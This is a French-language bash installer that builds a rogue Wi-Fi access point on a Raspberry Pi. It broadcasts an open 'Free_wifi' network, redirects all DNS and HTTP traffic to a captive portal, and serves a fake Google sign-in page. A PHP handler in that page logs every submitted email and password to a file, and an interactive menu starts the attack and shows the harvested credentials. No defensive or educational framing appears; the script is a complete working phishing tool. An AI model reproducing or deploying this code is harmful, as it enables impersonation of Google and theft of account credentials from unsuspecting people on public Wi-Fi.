#!/bin/bash

# Répertoires
DIR="/home/pi/pineapple"
WWW="$DIR/www"
CAPTURE="$DIR/captures"
INTERFACE_AP="wlan1"
GATEWAY="10.0.0.1"

echo "[*] Mise à jour et installation des paquets..."
sudo apt update
sudo apt install -y hostapd dnsmasq lighttpd php

echo "[*] Création de l’arborescence..."
mkdir -p "$WWW" "$CAPTURE"

echo "[*] Configuration de dhcpcd..."
if ! grep -q "denyinterfaces $INTERFACE_AP" /etc/dhcpcd.conf; then
    echo "denyinterfaces $INTERFACE_AP" | sudo tee -a /etc/dhcpcd.conf
    sudo systemctl restart dhcpcd
fi

echo "[*] Désactivation de dnsmasq par défaut..."
sudo systemctl stop dnsmasq 2>/dev/null
sudo systemctl disable dnsmasq 2>/dev/null

echo "[*] Création de la fausse page Google..."
cat > "$WWW/index.php" << 'EOF'
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = $_POST["login"];
    $password = $_POST["password"];
    $creds = date("Y-m-d H:i:s") . " - $login : $password\n";
    file_put_contents("/home/pi/pineapple/captures/creds.txt", $creds, FILE_APPEND);
    header("Location: https://www.google.com");
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Connexion Internet</title>
  <style>
    body {
      background-color: #f2f2f2;
      font-family: 'Roboto', sans-serif;
      text-align: center;
      margin: 0;
      padding: 0;
    }
    .container {
      margin-top: 100px;
      background-color: white;
      display: inline-block;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0px 0px 15px rgba(0,0,0,0.2);
    }
    h1 {
      color: #4285F4;
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      padding: 10px;
      margin: 10px 0;
      width: 250px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }
    input[type="submit"] {
      background-color: #4285F4;
      color: white;
      border: none;
      padding: 10px 20px;
      margin-top: 20px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 14px;
    }
    input[type="submit"]:hover {
      background-color: #3367D6;
    }
    .footer {
      margin-top: 50px;
      font-size: 12px;
      color: #aaa;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Connexion au réseau</h1>
    <p>Pour accéder à Internet, connectez-vous avec vos identifiants Google.</p>
    <form method="POST">
      <input type="text" name="login" placeholder="Adresse e-mail"><br>
      <input type="password" name="password" placeholder="Mot de passe"><br>
      <input type="submit" value="Se connecter">
    </form>
  </div>
  <div class="footer">
    © Google Inc.
  </div>
</body>
</html>
EOF

echo "[*] Ajout des fichiers de détection captive portal..."
echo "<html><meta http-equiv='refresh' content='0; url=/index.php'></html>" > "$WWW/generate_204"
cp "$WWW/generate_204" "$WWW/hotspot-detect.html"
cp "$WWW/generate_204" "$WWW/ncsi.txt"

echo "[*] Génération des configurations hostapd et dnsmasq..."
cat > "$DIR/hostapd.conf" <<EOF
interface=$INTERFACE_AP
driver=nl80211
ssid=Free_wifi
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
EOF

cat > "$DIR/dnsmasq.conf" <<EOF
interface=$INTERFACE_AP
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.50,12h
address=/#/10.0.0.1
EOF

echo "[*] Création du menu interactif pineapple_menu.sh..."
cat > "$DIR/pineapple_menu.sh" << 'EOF'
#!/bin/bash

WLAN_FAKEAP="wlan1"
GATEWAY="10.0.0.1"
DIR="/home/pi/pineapple"
CAPTURE_FILE="$DIR/captures/creds.txt"

start_pineapple() {
    echo "[*] Démarrage du fake AP..."
    sudo ip link set "$WLAN_FAKEAP" down
    sudo iw dev "$WLAN_FAKEAP" set type __ap
    sudo ip addr flush dev "$WLAN_FAKEAP"
    sudo ip addr add "$GATEWAY/24" dev "$WLAN_FAKEAP"
    sudo ip link set "$WLAN_FAKEAP" up

    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
    sudo iptables -F
    sudo iptables -t nat -F
    sudo iptables -t nat -A PREROUTING -i "$WLAN_FAKEAP" -p tcp --dport 80 -j DNAT --to "$GATEWAY":80
    sudo iptables -t nat -A POSTROUTING -j MASQUERADE

    echo "[*] Déploiement des fichiers web..."
    sudo rm -rf /var/www/html/*
    sudo cp -r "$DIR/www/"* /var/www/html/
    sudo systemctl restart lighttpd

    sudo dnsmasq -C "$DIR/dnsmasq.conf"
    sudo hostapd "$DIR/hostapd.conf" &

    echo "[✔] Pineapple actif. SSID : Free_wifi"
    read -p "Appuie sur Entrée pour revenir au menu..."
}

stop_pineapple() {
    echo "[*] Arrêt du Pineapple..."
    sudo killall hostapd dnsmasq 2>/dev/null
    sudo iptables -F
    sudo iptables -t nat -F
    sudo ip addr flush dev "$WLAN_FAKEAP"
    sudo ip link set "$WLAN_FAKEAP" down
    sudo iw dev "$WLAN_FAKEAP" set type managed
    sudo ip link set "$WLAN_FAKEAP" up
    echo "[✔] Pineapple arrêté."
    read -p "Appuie sur Entrée pour revenir au menu..."
}

show_creds() {
    echo -e "\n[📄] Identifiants capturés :"
    if [[ -f "$CAPTURE_FILE" ]]; then
        cat "$CAPTURE_FILE"
    else
        echo "Aucun identifiant trouvé."
    fi
    echo
    read -p "Appuie sur Entrée pour revenir au menu..."
}

clear_creds() {
    if [[ -f "$CAPTURE_FILE" ]]; then
        > "$CAPTURE_FILE"
        echo "[✔] Identifiants effacés."
    else
        echo "Aucun fichier à vider."
    fi
    read -p "Appuie sur Entrée pour revenir au menu..."
}

while true; do
    clear
    echo "============================="
    echo "   🍍 MENU PINEAPPLE RPi"
    echo "============================="
    echo "1. Démarrer le Pineapple"
    echo "2. Arrêter le Pineapple"
    echo "3. Voir les identifiants capturés"
    echo "4. Vider les identifiants"
    echo "5. Quitter"
    echo "-----------------------------"
    read -p "Choix [1-5] : " choice

    case "$choice" in
        1) start_pineapple ;;
        2) stop_pineapple ;;
        3) show_creds ;;
        4) clear_creds ;;
        5) echo "À bientôt !"; exit 0 ;;
        *) echo "Option invalide."; sleep 1 ;;
    esac
done
EOF

chmod +x "$DIR/pineapple_menu.sh"

echo "[*] Préparation du fichier de capture..."
touch "$CAPTURE/creds.txt"
sudo chown -R www-data:www-data "$CAPTURE"
sudo chmod -R 755 "$CAPTURE"

echo "[✔] Installation terminée."
echo "➡️  Lance le menu avec : bash $DIR/pineapple_menu.sh"